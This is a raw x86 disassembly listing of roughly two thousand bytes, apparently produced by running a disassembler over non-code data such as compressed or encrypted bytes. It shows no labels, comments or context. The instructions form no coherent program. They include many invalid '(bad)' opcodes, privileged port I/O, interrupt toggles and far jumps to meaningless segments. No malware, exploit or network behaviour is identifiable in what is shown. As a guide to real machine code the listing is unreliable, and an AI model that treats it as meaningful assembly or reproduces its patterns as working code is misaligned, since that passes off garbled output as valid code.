  409127:	imul   esp,DWORD PTR [edx-0x62ce59b],0x1a302d8e
  409131:	and    eax,0x837819f9
  409136:	pushf  
  409137:	adc    DWORD PTR [eax*4-0x481c7282],eax
  40913e:	retf   
  40913f:	cli    
  409140:	mov    al,ds:0x5efc91b0
  409145:	mov    bh,0x8d
  409147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409148:	cmp    DWORD PTR ds:0x22275fd6,eax
  40914e:	pop    es
  40914f:	mov    bh,0x3b
  409151:	jg     0x4091cc
  409153:	call   0xfed358cc
  409158:	in     al,dx
  409159:	inc    edx
  40915a:	jecxz  0x40913c
  40915c:	adc    esi,ebx
  40915e:	inc    edi
  40915f:	adc    eax,DWORD PTR [edi-0x3abe0849]
  409165:	fsub   DWORD PTR [ebp+0x27f45a09]
  40916b:	xchg   edx,eax
  40916c:	jp     0x409165
  40916e:	mov    eax,0x6f7be4e1
  409173:	sti    
  409174:	ret    0x8e49
  409177:	mov    BYTE PTR [ecx],dh
  409179:	out    0x4,al
  40917b:	pusha  
  40917c:	ins    BYTE PTR es:[edi],dx
  40917d:	add    esi,edx
  40917f:	inc    eax
  409180:	jecxz  0x409132
  409182:	jo     0x40919f
  409184:	aaa    
  409185:	mov    WORD PTR [eax-0x4a895574],?
  40918b:	es jae 0x409195
  40918e:	inc    edx
  40918f:	mov    esp,0x3bbd1393
  409194:	bound  ebx,QWORD PTR [esi]
  409196:	(bad)  
  409197:	pop    esi
  409198:	xchg   ecx,eax
  409199:	sub    BYTE PTR [eax+0x6d0edd1b],0x34
  4091a0:	sub    al,0x50
  4091a2:	popf   
  4091a3:	into   
  4091a4:	imul   eax,edx,0x1d
  4091a7:	sub    eax,DWORD PTR [ebx-0x11075c18]
  4091ad:	cdq    
  4091ae:	push   ebp
  4091af:	push   esp
  4091b0:	cwde   
  4091b1:	iret   
  4091b2:	pusha  
  4091b3:	cmp    al,0xe2
  4091b5:	ficomp DWORD PTR [edi]
  4091b7:	mov    ah,0xae
  4091b9:	add    BYTE PTR [ebx-0x7c4c996f],ch
  4091bf:	mov    esi,0x54acdd61
  4091c4:	add    eax,0x59961680
  4091c9:	test   BYTE PTR [ecx-0x6],dl
  4091cc:	mov    al,dh
  4091ce:	or     DWORD PTR [edi+0x59aa2453],edx
  4091d4:	dec    ebp
  4091d5:	int3   
  4091d6:	inc    ebx
  4091d7:	jne    0x409182
  4091d9:	cs inc ecx
  4091db:	jb     0x409236
  4091dd:	or     edi,esp
  4091df:	inc    ebp
  4091e0:	mov    eax,ds:0x1979652c
  4091e5:	cmp    eax,0x7e6ffabc
  4091ea:	cmp    eax,0xd5d572a6
  4091ef:	out    0x4,eax
  4091f1:	pop    ss
  4091f2:	rcr    DWORD PTR [ebx+ebp*1+0x73],1
  4091f6:	mov    BYTE PTR [edi+0x53cc6ad3],ah
  4091fc:	aas    
  4091fd:	pop    ebx
  4091fe:	inc    edi
  4091ff:	xlat   BYTE PTR ds:[ebx]
  409200:	dec    ebx
  409201:	cmp    bl,BYTE PTR [eax]
  409203:	inc    edx
  409204:	call   0x2444:0x4ecc68bc
  40920b:	xor    al,0x7a
  40920d:	mov    al,ds:0x73b0db8a
  409212:	dec    ecx
  409213:	popa   
  409214:	loopne 0x40927d
  409216:	xchg   esi,esi
  409218:	scas   eax,DWORD PTR es:[edi]
  409219:	push   ds
  40921a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40921b:	sahf   
  40921c:	push   cs
  40921d:	scas   al,BYTE PTR es:[edi]
  40921e:	push   esp
  40921f:	xlat   BYTE PTR ds:[ebx]
  409220:	lahf   
  409221:	call   0x18a7:0xfa474ddc
  409228:	shr    BYTE PTR [ecx+ecx*4],0xd2
  40922c:	adc    ah,BYTE PTR [ecx+0x1c1d0e71]
  409232:	pop    ss
  409233:	push   ecx
  409234:	(bad)  
  409235:	pop    ss
  409236:	xor    bl,BYTE PTR [ebp-0x28d2ac4b]
  40923c:	in     al,0xfe
  40923e:	cwde   
  40923f:	dec    esp
  409240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409241:	adc    eax,0xf86a7f39
  409246:	inc    ebx
  409247:	daa    
  409248:	xlat   BYTE PTR ds:[ebx]
  409249:	sub    eax,0x705c30c
  40924e:	inc    edx
  40924f:	and    BYTE PTR [edx],0x65
  409252:	jl     0x409250
  409254:	jg     0x40929d
  409256:	cmp    BYTE PTR [ebp+0x4317ad76],al
  40925c:	rol    dh,1
  40925e:	cmp    ecx,DWORD PTR [ebx+0x51]
  409261:	cmp    al,ch
  409263:	push   ebp
  409264:	mov    ecx,0x76de0555
  409269:	(bad)  
  40926a:	dec    edi
  40926b:	les    edi,FWORD PTR [esi]
  40926d:	out    0x6f,al
  40926f:	test   DWORD PTR ds:0xb3e5a254,esi
  409275:	ror    BYTE PTR [esi-0x30],cl
  409278:	inc    edi
  409279:	sub    al,0xd3
  40927b:	fnstcw WORD PTR [ebp+0x86540dd]
  409281:	out    0x98,eax
  409283:	add    eax,esi
  409285:	lock add eax,0x66d86067
  40928b:	pop    ebp
  40928c:	push   0x11f96dab
  409291:	test   eax,0x5b181741
  409296:	xor    al,0xfd
  409298:	ret    0xa3d4
  40929b:	ret    0xe6e3
  40929e:	add    DWORD PTR [edx],edi
  4092a0:	mov    edx,0x3d206bbb
  4092a5:	(bad)  
  4092a6:	daa    
  4092a7:	jo     0x409254
  4092a9:	icebp  
  4092aa:	pop    esi
  4092ab:	in     eax,dx
  4092ac:	fld1   
  4092ae:	shl    dl,cl
  4092b0:	rcr    DWORD PTR [edi-0x78],cl
  4092b3:	pop    edx
  4092b4:	jle    0x409245
  4092b6:	lock pop es
  4092b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092b9:	jns    0x409303
  4092bb:	jle    0x4092c7
  4092bd:	xchg   ebp,eax
  4092be:	stos   DWORD PTR es:[edi],eax
  4092bf:	xor    bh,BYTE PTR [eax]
  4092c1:	sbb    esi,DWORD PTR [edx-0x2f]
  4092c4:	xchg   DWORD PTR [edi-0x2d],ebp
  4092c7:	outs   dx,BYTE PTR ds:[esi]
  4092c8:	in     eax,0x94
  4092ca:	es lock add eax,0x9503cccd
  4092d1:	(bad)
  4092d4:	nop
  4092d5:	push   edx
  4092d6:	pop    edx
  4092d7:	jp     0x409342
  4092d9:	ret    
  4092da:	mov    eax,0x6c4029f6
  4092df:	mov    esp,0xfaa0b952
  4092e4:	ror    DWORD PTR [eax+0x29],0x56
  4092e8:	ins    BYTE PTR es:[edi],dx
  4092e9:	pop    ebp
  4092ea:	jns    0x4092ff
  4092ec:	add    ebx,DWORD PTR [esi+eax*2+0xf]
  4092f0:	mov    BYTE PTR [edi],dl
  4092f2:	xchg   ecx,eax
  4092f3:	sub    eax,0xa77b58ac
  4092f8:	and    ecx,DWORD PTR ds:0x4ce81b90
  4092fe:	and    DWORD PTR [edx+ecx*1+0x5d62169],ebx
  409305:	test   DWORD PTR [ecx-0x65],esi
  409308:	dec    edx
  409309:	pop    ds
  40930a:	ja     0x409321
  40930c:	int3   
  40930d:	mov    bh,0xda
  40930f:	pop    ss
  409310:	neg    dl
  409312:	jge    0x40936a
  409314:	retf   0x7301
  409317:	ret    
  409318:	(bad)  
  409319:	mov    cl,0x88
  40931b:	cs or  eax,0xfe4d6428
  409321:	lds    esp,FWORD PTR [eax+0x16715291]
  409327:	into   
  409328:	push   ds
  409329:	test   ebp,0x366e8b12
  40932f:	cwde   
  409330:	fnstenv [ebx-0x14b31f09]
  409336:	xor    ch,BYTE PTR [esi+edx*2+0x2d9f7de0]
  40933d:	pop    edi
  40933e:	cli    
  40933f:	clc    
  409340:	add    eax,0x300be3d9
  409345:	add    BYTE PTR [ecx],ch
  409347:	sub    DWORD PTR [ecx-0x5224362d],ebp
  40934d:	int    0xad
  40934f:	or     al,0xbf
  409351:	das    
  409352:	mov    ds:0x55f94e43,al
  409357:	ret    0xf18b
  40935a:	mov    dl,ch
  40935c:	sbb    al,0x3e
  40935e:	or     dl,al
  409360:	push   eax
  409361:	inc    ebp
  409362:	lods   eax,DWORD PTR ds:[esi]
  409363:	xchg   ebx,eax
  409364:	leave  
  409365:	outs   dx,BYTE PTR gs:[esi]
  409367:	int    0x2b
  409369:	adc    al,0x7e
  40936b:	adc    eax,0xeea0a209
  409370:	xchg   DWORD PTR [edx-0x4a],ebx
  409373:	jne    0x40934c
  409375:	shl    BYTE PTR [ecx],cl
  409377:	or     dl,ah
  409379:	aad    0x6d
  40937b:	test   al,0x2d
  40937d:	pop    ds
  40937e:	mov    dl,0x2b
  409380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409381:	or     BYTE PTR [edx+ecx*4+0x492c81cd],dl
  409388:	mov    ecx,0x9b1daea8
  40938d:	xchg   ecx,eax
  40938e:	loopne 0x409382
  409390:	shl    BYTE PTR [edi-0xc328a73],1
  409396:	pop    esp
  409397:	ds in  eax,dx
  409399:	sar    ch,0xe4
  40939c:	and    eax,0x146c9a29
  4093a1:	pusha  
  4093a2:	stc    
  4093a3:	xchg   esp,eax
  4093a4:	mov    edi,0x918718d5
  4093a9:	pop    eax
  4093aa:	clc    
  4093ab:	cdq    
  4093ac:	jle    0x4093b8
  4093ae:	mov    ecx,0xcffc52db
  4093b3:	inc    esp
  4093b4:	jnp    0x40937a
  4093b6:	mov    bl,0x49
  4093b8:	adc    bh,ch
  4093ba:	outs   dx,BYTE PTR ds:[esi]
  4093bb:	and    esi,edi
  4093bd:	icebp  
  4093be:	fwait
  4093bf:	cmp    DWORD PTR [ebx-0x590ecf32],0x14
  4093c6:	clc    
  4093c7:	and    al,0xc6
  4093c9:	bnd jle 0x4093b9
  4093cc:	mov    bl,0xc
  4093ce:	pop    ds
  4093cf:	add    dh,BYTE PTR [ecx-0x3d]
  4093d2:	xor    DWORD PTR [ebp+0x48ed76e3],edx
  4093d8:	stc    
  4093d9:	push   esp
  4093da:	call   0xbe72:0xb5af1ac2
  4093e1:	test   al,0x84
  4093e3:	mov    esi,ebp
  4093e5:	mov    eax,0x6101f69e
  4093ea:	inc    esp
  4093eb:	retf   
  4093ec:	add    BYTE PTR [ebp-0x3c87bc38],ch
  4093f2:	lods   eax,DWORD PTR ds:[esi]
  4093f3:	retf   
  4093f4:	pusha  
  4093f5:	jmp    0x50f4:0x2ad8f39a
  4093fc:	push   ebp
  4093fd:	mov    esi,0x604f648d
  409402:	cld    
  409403:	jp     0x409423
  409405:	fstp   st(6)
  409407:	push   0xffffff97
  409409:	(bad)  
  40940a:	sti    
  40940b:	and    BYTE PTR [ebx+0x442111f6],dl
  409411:	inc    ebp
  409412:	clc    
  409413:	cmp    al,0x22
  409415:	(bad)  
  409416:	mov    edx,0x81c2578a
  40941b:	xor    DWORD PTR [eax+0x6],0xffffffd1
  40941f:	mov    eax,ds:0x2a5b54f4
  409424:	jne    0x40942f
  409426:	daa    
  409427:	add    al,0x4e
  409429:	shl    esi,cl
  40942b:	mov    BYTE PTR [eax+ebp*1+0x5b],cl
  40942f:	(bad)  [edi-0x31fd4e6e]
  409435:	and    eax,DWORD PTR [ebx]
  409437:	jmp    esp
  409439:	sub    edx,edi
  40943b:	inc    ebp
  40943c:	idiv   DWORD PTR [edi-0x3dd8e4f4]
  409442:	icebp  
  409443:	enter  0x5a30,0xc6
  409447:	pop    es
  409448:	jle    0x4094ae
  40944a:	pop    esp
  40944b:	sar    BYTE PTR [edx-0x610a8cb2],0x5a
  409452:	xchg   esp,eax
  409453:	lea    esi,[ebp-0x5d]
  409456:	xor    dl,BYTE PTR [edx-0x1903f768]
  40945c:	gs ja  0x4094c2
  40945f:	mov    dl,0x76
  409461:	mov    ch,0x29
  409463:	test   al,0x98
  409465:	dec    ecx
  409466:	add    DWORD PTR [ebp-0x79],edx
  409469:	push   edx
  40946a:	(bad)  
  40946b:	scas   eax,DWORD PTR es:[edi]
  40946c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40946d:	sbb    BYTE PTR [eax],0xe5
  409470:	sbb    DWORD PTR [eax],esp
  409472:	aas    
  409473:	add    BYTE PTR [ecx+0x4de5443f],ch
  409479:	js     0x409447
  40947b:	ss int3 
  40947d:	in     al,0xc
  40947f:	cli    
  409480:	inc    ecx
  409481:	mov    eax,ds:0x10720687
  409486:	xor    DWORD PTR [eax+0x30],ebp
  409489:	ror    DWORD PTR [eax-0x3f],1
  40948c:	cdq    
  40948d:	xchg   edi,eax
  40948e:	dec    BYTE PTR [ebx+0x54]
  409491:	push   eax
  409492:	fnstenv [ecx]
  409494:	jp     0x409419
  409496:	pop    ebp
  409497:	fdivr  QWORD PTR [eax-0x6a58fe5e]
  40949d:	call   0x7f0c:0xfb458ecc
  4094a4:	and    bh,ch
  4094a6:	fistp  QWORD PTR [edx+edx*1-0xb902a21]
  4094ad:	dec    esp
  4094ae:	das    
  4094af:	push   ebp
  4094b0:	test   eax,0x1b747545
  4094b5:	bound  ebp,QWORD PTR [edi-0x27a269dd]
  4094bb:	js     0x4094b8
  4094bd:	aaa    
  4094be:	rcl    BYTE PTR [edi-0x2f668ca3],cl
  4094c4:	xchg   esp,eax
  4094c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094c6:	mov    dh,0x1e
  4094c8:	jp     0x409463
  4094ca:	sar    BYTE PTR [edi+0x28],0x7f
  4094ce:	hlt    
  4094cf:	and    BYTE PTR [ecx],bl
  4094d1:	jno    0x409512
  4094d3:	dec    esp
  4094d4:	cmp    bl,ah
  4094d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094d7:	mov    ebx,0x48f08e3c
  4094dc:	sbb    DWORD PTR [esi-0x61],ebp
  4094df:	ret    0x691f
  4094e2:	je     0x409541
  4094e4:	retf   
  4094e5:	adc    DWORD PTR [esi],ecx
  4094e7:	and    esp,DWORD PTR [ebx+0x621049c]
  4094ed:	mov    al,ds:0xf51bb28f
  4094f2:	enter  0xa328,0xaa
  4094f6:	cwde   
  4094f7:	(bad)  
  4094f8:	cmp    DWORD PTR [edx-0x6a],eax
  4094fb:	xchg   esp,eax
  4094fc:	sub    DWORD PTR [eax+0x42a6149c],eax
  409502:	sub    DWORD PTR [ebx],esi
  409504:	aaa    
  409505:	add    edi,ecx
  409507:	stos   DWORD PTR es:[edi],eax
  409508:	push   ebx
  409509:	bound  esi,QWORD PTR [ecx+0x7c4dcfb9]
  40950f:	and    dh,BYTE PTR [edi-0x348a94a]
  409515:	arpl   WORD PTR [ebp+0x294ceb09],bx
  40951b:	cs in  al,0x79
  40951e:	xlat   BYTE PTR ds:[ebx]
  40951f:	mov    DWORD PTR [ebp-0x16221aa0],ebp
  409525:	inc    edx
  409526:	(bad)  
  409527:	mov    dh,0x21
  409529:	or     cl,BYTE PTR [esi+0x4ce51700]
  40952f:	add    bl,BYTE PTR fs:[ebp-0x7c94dffc]
  409536:	push   esi
  409537:	(bad)  
  409538:	adc    eax,0x6e7f83f0
  40953d:	mov    DWORD PTR [edx+0x3c],esi
  409540:	xchg   edi,eax
  409541:	scas   al,BYTE PTR es:[edi]
  409542:	mov    ds:0xfa78b604,al
  409547:	sub    dl,BYTE PTR [ecx-0x6]
  40954a:	or     BYTE PTR es:[ebx],0x78
  40954e:	outs   dx,BYTE PTR ds:[esi]
  40954f:	or     bl,BYTE PTR [esi+0x1046b0f2]
  409555:	in     al,dx
  409556:	or     edi,ebp
  409558:	popa   
  409559:	pop    edi
  40955a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40955b:	mov    ah,0x30
  40955d:	jne    0x409529
  40955f:	pushf  
  409560:	mov    bh,0x2b
  409562:	loope  0x409510
  409564:	mov    al,0x30
  409566:	ins    DWORD PTR es:[edi],dx
  409567:	outs   dx,BYTE PTR ds:[esi]
  409568:	in     al,dx
  409569:	xchg   ebx,eax
  40956a:	ins    DWORD PTR es:[edi],dx
  40956b:	out    0x2,al
  40956d:	int    0xea
  40956f:	cmp    BYTE PTR [edx],0xc1
  409572:	lahf   
  409573:	mov    BYTE PTR [ecx+0xddc9d6d],0x5e
  40957a:	dec    ecx
  40957b:	sbb    al,0xec
  40957d:	mov    edx,DWORD PTR es:[ebx-0x5e7cf3f0]
  409584:	cld    
  409585:	sub    edi,DWORD PTR [esi-0x23]
  409588:	pop    ss
  409589:	mov    cl,0xa8
  40958b:	xchg   ebp,eax
  40958c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40958d:	nop
  40958e:	pop    ecx
  409590:	mov    ds:0xfb9ab244,al
  409595:	jae    0x40960a
  409597:	mov    bl,0xb4
  409599:	retf   
  40959a:	test   BYTE PTR [edx+eiz*2+0x4db0d55b],dl
  4095a1:	call   0x7738:0x4ca8dbbc
  4095a8:	push   eax
  4095a9:	mov    esi,0x1c95537f
  4095ae:	xchg   edx,eax
  4095af:	mov    cl,BYTE PTR [esi-0x45]
  4095b2:	mov    eax,ds:0x1354a064
  4095b7:	gs mov ebp,0x62e22621
  4095bd:	(bad)  
  4095be:	fidiv  WORD PTR [eax+0x330cb606]
  4095c4:	bound  esp,QWORD PTR [ebx-0x2f]
  4095c7:	sbb    BYTE PTR [esi-0x152f2060],dh
  4095cd:	cdq    
  4095ce:	rol    dl,1
  4095d0:	and    al,ch
  4095d2:	fwait
  4095d3:	adc    BYTE PTR [edi-0x56a1dddb],al
  4095d9:	sub    al,0x4e
  4095db:	das    
  4095dc:	or     BYTE PTR [ebp+edi*1-0x27],ah
  4095e0:	jne    0x40964e
  4095e2:	aam    0x39
  4095e4:	(bad)  [edx+0x1d8cb523]
  4095ea:	sub    DWORD PTR [esi+0x6d],0xffffffad
  4095ee:	mov    bl,0xbf
  4095f0:	xor    BYTE PTR ds:0x9dbe0d92,al
  4095f6:	into   
  4095f7:	and    BYTE PTR [ebx+0x28],bh
  4095fa:	stos   BYTE PTR es:[edi],al
  4095fb:	push   ds
  4095fc:	in     al,dx
  4095fd:	cdq    
  4095fe:	ror    DWORD PTR [esi+0x7e],0x3c
  409602:	shl    BYTE PTR [ebx+ecx*8],cl
  409605:	mov    DWORD PTR [eax-0x5],esp
  409608:	(bad)  
  409609:	repz and esi,edi
  40960c:	push   ss
  40960d:	adc    eax,0x8a1ed544
  409612:	mov    ecx,0xdb90ac4e
  409617:	in     eax,0xad
  409619:	(bad)  
  40961b:	xchg   esp,eax
  40961c:	push   esi
  40961d:	cld    
  40961e:	dec    ebp
  40961f:	dec    ecx
  409620:	push   ebx
  409621:	push   esi
  409622:	mov    dh,0x3d
  409624:	mov    edi,0xdacfff4b
  409629:	popa   
  40962a:	adc    BYTE PTR [ebx+0x75],ah
  40962d:	daa    
  40962e:	xor    eax,0xc49459b3
  409633:	ss retf 
  409635:	mov    DWORD PTR [esi],ebx
  409637:	pop    eax
  409638:	ds push edi
  40963a:	int    0x62
  40963c:	push   ds
  40963d:	stos   BYTE PTR es:[edi],al
  40963e:	sub    eax,0x9b2fdd5c
  409643:	lahf   
  409644:	mov    ch,0x58
  409646:	cli    
  409647:	scas   eax,DWORD PTR es:[edi]
  409648:	jg     0x85d42ba9
  40964e:	adc    BYTE PTR [edx+0x38],bl
  409651:	repz fistp DWORD PTR [ecx+eax*2-0x43]
  409656:	cmp    cl,BYTE PTR [ecx]
  409658:	push   ecx
  409659:	inc    edi
  40965a:	mov    esi,0xf2b9c3ce
  40965f:	ds dec ebx
  409661:	mov    DWORD PTR [edi-0x32c8007b],ebp
  409667:	jo     0x409649
  409669:	sub    DWORD PTR [esi+0xa],0x12
  40966d:	xchg   edi,eax
  40966e:	jmp    0x8cb9:0x32162fcc
  409675:	xchg   ebp,eax
  409676:	jg     0x40963c
  409678:	xor    DWORD PTR [eax],0xffffffb3
  40967b:	cli    
  40967c:	mov    ebp,0x97362616
  409681:	add    eax,0x8e0466ac
  409686:	and    DWORD PTR [eax-0x31d7e8b4],esp
  40968c:	outs   dx,BYTE PTR ds:[esi]
  40968d:	pop    ss
  40968e:	and    bh,cl
  409690:	aad    0x47
  409692:	adc    BYTE PTR [ecx],cl
  409694:	stos   DWORD PTR es:[edi],eax
  409695:	jbe    0x409682
  409697:	and    edi,ebx
  409699:	xor    bh,BYTE PTR [edi]
  40969b:	std    
  40969c:	and    eax,0x355f9416
  4096a1:	push   0xdec563c6
  4096a6:	hlt    
  4096a7:	pop    edx
  4096a8:	ss jl  0x4096c8
  4096ab:	enter  0x31a6,0x85
  4096af:	jp     0x4096cf
  4096b1:	mov    ebp,0x4a9f5bc1
  4096b6:	cdq    
  4096b7:	jno    0x409697
  4096b9:	sub    al,0x60
  4096bb:	dec    ecx
  4096bc:	rcr    DWORD PTR [ecx],cl
  4096be:	or     al,0x34
  4096c0:	cli    
  4096c1:	out    0x0,al
  4096c3:	addr16 movs BYTE PTR es:[di],BYTE PTR fs:[si]
  4096c7:	xor    DWORD PTR [edx+0x23f9da9c],0x851ff830
  4096d1:	js     0x409748
  4096d3:	adc    al,0x75
  4096d5:	ins    BYTE PTR es:[edi],dx
  4096d6:	aam    0x35
  4096d8:	outs   dx,DWORD PTR ds:[esi]
  4096d9:	stos   DWORD PTR es:[edi],eax
  4096da:	imul   ecx,DWORD PTR ds:0xde45a73f,0xdb77b819
  4096e4:	(bad)  
  4096e5:	mov    BYTE PTR [eax],al
  4096e7:	inc    esi
  4096e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096e9:	add    ah,ah
  4096eb:	mov    dh,0xf2
  4096ed:	out    dx,al
  4096ee:	int3   
  4096ef:	ss iret 
  4096f1:	and    eax,0x35d1f78f
  4096f6:	lds    esi,FWORD PTR [edi]
  4096f8:	pop    edi
  4096f9:	jo     0x40970c
  4096fb:	lods   al,BYTE PTR ds:[esi]
  4096fc:	or     dl,BYTE PTR [edx]
  4096fe:	mov    edx,0xba937087
  409703:	push   ebx
  409704:	push   ebx
  409705:	ret    0x8601
  409708:	or     eax,0x6ede60a2
  40970d:	ror    DWORD PTR [edx],1
  40970f:	cdq    
  409710:	std    
  409711:	pop    esi
  409712:	jge    0x409788
  409714:	ror    DWORD PTR [edx-0x2d],cl
  409717:	jmp    0xd8dc:0x46e2dfe
  40971e:	clc    
  40971f:	sti    
  409720:	jecxz  0x4096fb
  409722:	pop    ss
  409723:	gs popf 
  409725:	jnp    0x4096d7
  409727:	aas    
  409728:	pop    es
  409729:	cwde   
  40972a:	xchg   ecx,eax
  40972b:	call   0x4486:0x4cceb507
  409732:	outs   dx,BYTE PTR ds:[esi]
  409733:	lds    esi,FWORD PTR [ecx+0x35]
  409736:	icebp  
  409737:	stc    
  409738:	lock mov dh,0x23
  40973b:	es push es
  40973d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40973e:	mov    BYTE PTR [ecx],ah
  409740:	or     DWORD PTR [ecx+0x2a02df01],edx
  409746:	ret    
  409747:	(bad)  
  409749:	sbb    DWORD PTR [edx+0x70],0xaa9ce17e
  409750:	pop    edx
  409751:	sub    bl,BYTE PTR [ecx]
  409753:	fst    QWORD PTR [eax+0x32a6389d]
  409759:	outs   dx,DWORD PTR ds:[esi]
  40975a:	fdivr  QWORD PTR [edx]
  40975c:	popa   
  40975d:	std    
  40975e:	xchg   esi,eax
  40975f:	push   ebp
  409760:	jnp    0x409701
  409762:	inc    ecx
  409763:	fidivr WORD PTR [ebx]
  409765:	push   ds
  409766:	aam    0xa
  409768:	pop    eax
  409769:	ja     0x409722
  40976b:	outs   dx,BYTE PTR ds:[esi]
  40976c:	adc    DWORD PTR [ecx+esi*1+0x36],esp
  409770:	ret    
  409771:	scas   eax,DWORD PTR es:[edi]
  409772:	and    cl,al
  409774:	push   0xac99dd15
  409779:	xor    bl,BYTE PTR [edi+0x61]
  40977c:	int    0xa4
  40977e:	cmp    al,0xe5
  409780:	jb     0x409758
  409782:	xor    esp,ecx
  409784:	pop    ds
  409785:	and    DWORD PTR [edx],eax
  409787:	cld    
  409788:	(bad)  
  409789:	retf   0xa8e4
  40978c:	iret   
  40978d:	daa    
  40978e:	inc    ebx
  40978f:	or     bh,BYTE PTR [ebx+0x56]
  409792:	or     eax,0x1b5390d7
  409797:	mov    ss,WORD PTR [ebx+0x1de213aa]
  40979d:	ret    
  40979e:	xor    ch,BYTE PTR [ebp+0x46]
  4097a1:	xchg   esp,eax
  4097a2:	mov    ebp,0x6f4817dd
  4097a7:	mov    edi,0xec38da98
  4097ac:	retf   0xcafe
  4097af:	jno    0x40981c
  4097b1:	cmp    eax,0x8822c451
  4097b6:	dec    edi
  4097b7:	ja     0x409802
  4097b9:	push   eax
  4097ba:	ret    0x111f
  4097bd:	mov    ecx,DWORD PTR [eax-0x18]
  4097c0:	loop   0x409804
  4097c2:	jp     0x4097e3
  4097c4:	cmc    
  4097c5:	dec    edx
  4097c6:	xchg   esi,eax
  4097c7:	push   edx
  4097c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097c9:	mov    eax,0x654eb6e1
  4097ce:	push   esi
  4097cf:	test   al,0x3d
  4097d1:	mov    ch,0x6a
  4097d3:	pop    ds
  4097d4:	fld    QWORD PTR [ebx+edi*1]
  4097d7:	stos   DWORD PTR es:[edi],eax
  4097d8:	mov    DWORD PTR [ebx+0x6a],eax
  4097db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097dc:	fistp  QWORD PTR [edx]
  4097de:	fstp   QWORD PTR [edx+0x5c]
  4097e1:	mov    ss,WORD PTR ds:0x7b1aa314
  4097e7:	bound  eax,QWORD PTR [edx-0x18912afd]
  4097ed:	adc    BYTE PTR ds:0xd25205a4,ah
  4097f3:	and    DWORD PTR [edx-0x17],ebx
  4097f6:	nop
  4097f7:	repz fsub QWORD PTR [eax+0x6]
  4097fb:	mov    ebp,0x60b1ce87
  409800:	push   esp
  409801:	and    ecx,DWORD PTR [eax-0x61]
  409804:	mov    esi,0x414fcd4c
  409809:	inc    ecx
  40980a:	addr16 (bad) 
  40980c:	dec    edx
  40980d:	ret    0xd767
  409810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409811:	in     eax,dx
  409812:	std    
  409813:	or     esp,edi
  409815:	out    0x4a,eax
  409817:	jmp    0xc6e86941
  40981c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981d:	and    ecx,DWORD PTR [ebx-0x3a]
  409820:	mov    esp,0x5fad2f1e
  409825:	pop    ss
  409826:	stos   DWORD PTR es:[edi],eax
  409827:	mov    cl,0xfc
  409829:	push   0xfffffffa
  40982b:	mov    edx,0xdba000df
  409830:	iret   
  409831:	mov    eax,ds:0x3704e295
  409836:	(bad)  
  409837:	call   0xa40899c4
  40983c:	mov    BYTE PTR [ecx+0x9bc69f9],ch
  409842:	sbb    al,0x24
  409844:	mov    ds:0x930418bf,eax
  409849:	or     cl,bl
  40984b:	inc    esp
  40984c:	xchg   edx,eax
  40984d:	icebp  
  40984e:	neg    DWORD PTR [esp+esi*1]
  409851:	and    al,0x8a
  409853:	sbb    ecx,DWORD PTR [eax-0x6024ca3e]
  409859:	jge    0x40982b
  40985b:	lds    edx,FWORD PTR [ebx]
  40985d:	sub    BYTE PTR [edi],cl
  40985f:	mov    al,0xf5
  409861:	mov    DWORD PTR ds:0x113f7adc,ebp
  409867:	jnp    0x40987a
  409869:	push   edx
  40986b:	repz and edx,ebx
  40986e:	xchg   BYTE PTR ds:0xfac477c4,dl
  409874:	push   ds
  409875:	sbb    al,0x42
  409877:	out    0x7e,al
  409879:	icebp  
  40987a:	dec    bl
  40987c:	stos   BYTE PTR es:[edi],al
  40987d:	mov    WORD PTR [esi-0x9],gs
  409880:	imul   ebx,DWORD PTR [ecx],0x1f
  409883:	dec    eax
  409884:	ret    
  409885:	pop    esi
  409886:	daa    
  409887:	xor    ah,0xea
  40988a:	jne    0x4098fe
  40988c:	or     esp,ebp
  40988e:	fld    QWORD PTR [esi-0x6d7e376a]
  409894:	jo     0x409828
  409896:	std    
  409897:	cli    
  409898:	stc    
  409899:	rol    BYTE PTR [ebx-0x55],0x7a
  40989d:	inc    esi
  40989e:	add    eax,0xd0881220
  4098a3:	mov    bh,0xe9
  4098a5:	aam    0x12
  4098a7:	sbb    edx,DWORD PTR [esi]
  4098a9:	mov    al,ds:0xd4761cbb
  4098ae:	mov    bh,0xba
  4098b0:	out    dx,eax
  4098b1:	mov    ds:0x5602622e,eax
  4098b6:	cmp    eax,0xb3ef582e
  4098bb:	and    DWORD PTR [eax-0x43cc6787],edx
  4098c1:	ja     0x4098e9
  4098c3:	dec    edx
  4098c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098c5:	dec    ecx
  4098c6:	add    esp,ecx
  4098c8:	into   
  4098c9:	mov    al,0xe
  4098cb:	stc    
  4098cc:	into   
  4098cd:	fs jecxz 0x409890
  4098d0:	sub    dl,cl
  4098d2:	cld    
  4098d3:	lea    esp,[ecx]
  4098d5:	in     eax,0x5c
  4098d7:	inc    ecx
  4098d8:	(bad)
  4098db:	test   eax,0x38f327a
  4098e0:	or     edi,edi
  4098e2:	mov    cl,0xe0
  4098e4:	xchg   ecx,eax
  4098e5:	inc    edi
  4098e6:	outs   dx,DWORD PTR ds:[esi]
  4098e7:	fidivr WORD PTR [ebx-0x54666a8e]
  4098ed:	mov    eax,ds:0x91901069
  4098f2:	lds    ecx,FWORD PTR [ecx+0x78]
  4098f5:	inc    ebx
  4098f6:	nop
  4098f7:	in     al,dx
  4098f8:	cwde   
  4098f9:	inc    ecx
  4098fa:	(bad)  
  4098fb:	adc    DWORD PTR [eax-0x5c],edx
  4098fe:	xchg   ebp,eax
  4098ff:	jae    0x409914
  409901:	jmp    0x4098f5
  409903:	jp     0x409978
  409905:	pop    esi
  409906:	dec    edx
